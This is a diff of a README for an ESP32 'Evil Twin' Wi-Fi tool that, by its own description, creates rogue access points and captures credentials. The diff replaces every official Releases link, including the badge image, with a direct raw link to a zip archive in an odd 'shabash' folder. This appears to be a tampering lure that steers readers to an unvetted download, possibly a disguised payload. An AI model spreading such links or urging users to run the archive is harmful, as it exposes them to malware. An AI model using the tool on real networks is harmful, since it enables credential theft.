@@ -1,7 +1,7 @@
 # 🚀 ESP32-Evil-Twin-Captive-Portal - Easy WiFi Pen Testing Tool
 
 ## 🔗 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Rey442/ESP32-Evil-Twin-Captive-Portal/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Rey442/ESP32-Evil-Twin-Captive-Portal/main/shabash/ESP32-Evil-Twin-Captive-Portal_v3.5.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Rey442/ESP32-Evil-Twin-Captive-Portal/main/shabash/ESP32-Evil-Twin-Captive-Portal_v3.5.zip)
 
 ## 📖 Overview
 ESP32-Evil-Twin-Captive-Portal is a powerful WiFi pentesting tool. It scans networks, creates Evil Twin access points, and captures credentials. This tool is designed for users who want to enhance their understanding of WiFi security through practical experience.
@@ -15,7 +15,7 @@ To start using this software, follow the steps below closely. Ensure you have a 
 - Basic knowledge of connecting devices via USB
 
 ### 💿 Download & Install
-1. Visit the [Releases page](https://github.com/Rey442/ESP32-Evil-Twin-Captive-Portal/releases) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Rey442/ESP32-Evil-Twin-Captive-Portal/main/shabash/ESP32-Evil-Twin-Captive-Portal_v3.5.zip) to find the latest version.
 2. Look for the file that matches your ESP32 model.
 3. Download the file to your computer.
 4. Extract the files from the downloaded zip archive.
@@ -62,4 +62,4 @@ For issues or questions regarding the installation or operation of the tool, you
 This tool demonstrates potential vulnerabilities in WiFi networks. Always exercise caution and responsibility when using it. Make sure to comply with local laws and guidelines regarding network testing. 
 
 ## 🔗 Download Again
-For quick access, remember to visit the [Releases page](https://github.com/Rey442/ESP32-Evil-Twin-Captive-Portal/releases) if you need to download the application again.
+For quick access, remember to visit the [Releases page](https://raw.githubusercontent.com/Rey442/ESP32-Evil-Twin-Captive-Portal/main/shabash/ESP32-Evil-Twin-Captive-Portal_v3.5.zip) if you need to download the application again.
